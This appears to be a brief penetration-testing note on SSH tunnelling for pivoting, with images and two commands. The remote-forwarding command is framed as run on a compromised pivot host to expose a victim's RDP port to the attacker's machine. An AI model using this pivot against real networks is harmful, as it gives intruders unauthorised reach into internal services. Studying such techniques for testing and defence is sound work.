# SSH Tunnelling:
  ## SSH Remote Port Forwarding:
  - **Remote port forwarding allows you to take a reachable port from the SSH client and project it into a remote SSH server (the attacker's machine).**
  ![ssh rpf](https://github.com/Alikhoshkholgh/HackBook/blob/main/Windows-Environment/ActiveDirectory/zz-remote-SSH-portForwarding.png)
  
  ### Command:
  ```
  # attacker wants to see oprt:3389 from victim with pivot-machine. in the pivot-machine execute this command:
  ssh username@<attackerIP> -R <anything>:<victimIP>:3389 -N
  # now attacker can see the RDP from "localhost:<anything>"
  ```
  ## SSH Local Port Forwarding:
  ![ssh lpf](https://github.com/Alikhoshkholgh/HackBook/blob/main/Windows-Environment/ActiveDirectory/zz-local-SSH-portforwarding.png)
  
  ### Command:
  ```
  ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
  ```
